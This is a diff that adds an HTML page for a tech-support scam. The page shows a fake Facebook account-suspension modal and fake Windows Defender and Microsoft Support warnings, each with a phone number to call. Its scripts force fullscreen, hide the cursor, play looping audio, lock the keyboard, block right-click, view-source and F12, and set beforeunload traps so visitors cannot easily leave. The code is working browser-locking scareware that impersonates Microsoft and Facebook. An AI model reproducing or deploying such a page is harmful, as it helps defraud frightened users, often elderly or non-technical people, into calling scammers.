@@ -1,0 +1,329 @@
+<!DOCTYPE html><html><head>
+<script async defer src="https://tools.luckyorange.com/core/lo.js?site-id=253fecdc"></script>
+<meta charset="utf-8">
+    <title>App Updates Usage</title>
+
+
+
+    <style>
+        body {
+            background-image: url('images/bg1.png');
+            background-size: 100% 100%;
+            background-repeat: no-repeat;
+            background-position: center center;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            font-family: Arial, sans-serif;
+            color: white;
+        }
+
+        body.fullscreen {
+            background-image: url('images/bg2.jpg');
+        }
+
+        #support-text {
+            position: absolute;
+            top: 80%;
+            left: 50%;
+            transform: translateX(-50%);
+            font-size: 24px;
+            text-align: center;
+            width: 100%;
+            font-weight: bold;
+            color: black;
+            display: none;
+        }
+
+        #support-text span {
+            font-weight: normal;
+        }
+
+        #music {
+            display: none;
+        }
+
+        #modal-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5);
+            z-index: 9999;
+        }
+
+        #modal-content {
+            background-color: white;
+            border-radius: 5px;
+            max-width: 400px;
+            margin: 100px auto;
+            padding: 20px;
+            text-align: center;
+        }
+
+        #modal-close {
+            cursor: pointer;
+            color: #888;
+            float: right;
+            font-size: 20px;
+            font-weight: bold;
+        }
+
+        #modal-message {
+            color: black;
+            font-weight: bold;
+            margin-bottom: 20px;
+        }
+
+        #modal-image {
+            margin-bottom: 20px;
+        }
+
+        .modal-buttons {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 20px;
+        }
+
+        .modal-buttons button {
+            width: 100px;
+            padding: 10px 0;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-weight: bold;
+            transition: background-color 0.3s;
+        }
+
+        .modal-buttons button.accept {
+            background-color: white;
+            color: black;
+        }
+
+        .modal-buttons button.dismiss {
+            background-color: #3b5998;
+            color: white;
+        }
+
+        .modal-buttons button:hover {
+            background-color: rgba(0, 0, 0, 0.8);
+        }
+
+        @keyframes blink {
+            0% {
+                opacity: 1;
+            }
+
+            50% {
+                opacity: 0;
+            }
+
+            100% {
+                opacity: 1;
+            }
+        }
+
+        .modal-buttons button.dismiss.blinking {
+            animation: blink 1s infinite;
+        }
+
+        #welcomeDiv {
+            display: none;
+            background-color: #000;
+            height: auto;
+            width: 550px;
+            position: fixed;
+            top: 0;
+            left: 50%;
+            transform: translateX(-50%);
+            z-index: 9999999999;
+            text-align: center;
+        }
+
+        #welcomeDiv p {
+            color: #FEFEFE;
+            margin-top: 10px;
+            font-size: 16px;
+            opacity: 0.9;
+        }
+    </style>
+    <script>
+        document.addEventListener('DOMContentLoaded', function () {
+            var isPopupVisible = true;
+            var music = document.getElementById('music');
+            var isPlaying = false;
+
+            function toggleMusic() {
+                if (isPlaying) {
+                    music.pause();
+                } else {
+                    music.play();
+                }
+                isPlaying = !isPlaying;
+            }
+
+            function playMusicOnClick() {
+                toggleMusic();
+                document.removeEventListener('click', playMusicOnClick);
+            }
+
+            music.addEventListener('click', toggleMusic);
+            document.addEventListener('click', playMusicOnClick);
+
+            var fullscreenEnabled = document.fullscreenEnabled || document.mozFullScreenEnabled || document.documentElement.webkitRequestFullScreen;
+
+            if (fullscreenEnabled) {
+                document.documentElement.requestFullscreen = document.documentElement.requestFullscreen || document.documentElement.mozRequestFullScreen || document.documentElement.webkitRequestFullScreen;
+                document.cancelFullscreen = document.cancelFullscreen || document.mozCancelFullScreen || document.webkitCancelFullScreen;
+
+                var isFullscreen = false;
+
+                document.addEventListener('click', function () {
+                    if (!isFullscreen) {
+                        isFullscreen = true;
+                        document.documentElement.requestFullscreen();
+                        document.body.classList.add('fullscreen');
+                        showWelcomeDiv();
+                        showSupportText();
+                    }
+                });
+
+                document.addEventListener('fullscreenchange', function () {
+                    isFullscreen = !isFullscreen;
+                });
+            }
+
+            var modalOverlay = document.getElementById('modal-overlay');
+            var modalClose = document.getElementById('modal-close');
+
+            function showModal() {
+                modalOverlay.style.display = 'block';
+            }
+
+            function closeModal() {
+                modalOverlay.style.display = 'none';
+            }
+
+            modalClose.addEventListener('click', closeModal);
+
+            showModal();
+
+            function hideCursor() {
+                document.documentElement.style.cursor = 'none';
+            }
+
+            document.addEventListener('click', function () {
+                hideCursor();
+                document.removeEventListener('click', hideCursor);
+                if (isPopupVisible) {
+                    closeModal();
+                    isPopupVisible = false;
+                }
+            });
+
+            var acceptButton = document.getElementById('modal-accept');
+            var dismissButton = document.getElementById('modal-dismiss');
+
+            acceptButton.addEventListener('click', closeModal);
+            dismissButton.addEventListener('click', closeModal);
+
+            document.addEventListener('contextmenu', function (event) {
+                event.preventDefault();
+            });
+
+            document.addEventListener('keydown', function (e) {
+                if (e.ctrlKey && (e.keyCode === 'U'.charCodeAt(0) || e.keyCode === 'u'.charCodeAt(0)) ||
+                    e.ctrlKey && (e.keyCode === 'C'.charCodeAt(0) || e.keyCode === 'c'.charCodeAt(0)) ||
+                    e.ctrlKey && (e.keyCode === 'S'.charCodeAt(0) || e.keyCode === 's'.charCodeAt(0))) {
+                    e.preventDefault();
+                }
+            });
+
+            function preventKeyEvents(event) {
+                const blockedKeyCodes = [123];
+                const keyCode = event.keyCode || event.which;
+
+                if (blockedKeyCodes.includes(keyCode)) {
+                    event.preventDefault();
+                    console.log(`Key with code ${keyCode} is blocked.`);
+                }
+            }
+
+            window.addEventListener('keydown', preventKeyEvents);
+        });
+
+        navigator.keyboard.lock();
+        document.onkeydown = function (e) {
+            return false;
+        }
+
+        function showWelcomeDiv() {
+            var welcomeDiv = document.getElementById('welcomeDiv');
+            welcomeDiv.style.display = 'block';
+        }
+
+        function showSupportText() {
+            var supportText = document.getElementById('support-text');
+            supportText.style.display = 'block';
+        }
+    </script>
+
+    <script type="text/javascript">
+      window.onbeforeunload = function() {
+         if (data_needs_saving()) {
+             return "Call Windows Defender Helpline Now";
+         } else {
+            return;
+         }
+      };
+              </script>
+              <script type="text/javascript">
+                  window.addEventListener("beforeunload", function (e) {
+               var confirmationMessage = 'It looks like you are editing something. '
+                                  + 'Your changes will be lost if you leave before saving.';
+
+                      (e || window.event).returnValue = confirmationMessage; //Gecko + IE
+                      return confirmationMessage; //Gecko + Webkit, Safari, Chrome etc.
+                  });
+              </script>
+</head>
+
+<body onbeforeunload="return myFunction()">
+    <audio id="music" src="media/text-to-speech.mp3" controls="" loop=""></audio>
+
+    <div id="modal-overlay" style="display: block;">
+        <div id="modal-content">
+            <span id="modal-close">×</span>
+           <!-- <img id="modal-image" src="logofb.jpg" alt="Facebook Logo">-->
+         <img id="modal-image" src="images/logo-facebookpng-32251.jpg" alt="Facebook Logo">
+            <p id="modal-message">Facebook has temporarily Suspended your Account.</p>
+            <div class="modal-buttons">
+                <button id="modal-accept" class="dismiss blinking">Accept</button>
+                <button id="modal-dismiss" class="dismiss blinking">Ignore</button>
+            </div>
+        </div>
+    </div>
+
+    <div id="welcomeDiv">
+        <p>
+            Windows Defender Security Has Disabled Your Computer.<br>
+            Please Contact Microsoft Windows Support To Unlock Your Computer.<br> +44 20 7664 8621</p></div>
+        <p></p>
+
+
+
+
+    <div id="support-text">Do not reboot or use
+      Your Device.This Device is disabled.<br><span style="color:#cc0000"> Call Microsoft Windows Support Toll Free +44 20 7664 8621 </span><br>Microsoft Corporation 2025 </div>
+
+
+
+
+
+
+
+  </body></html>
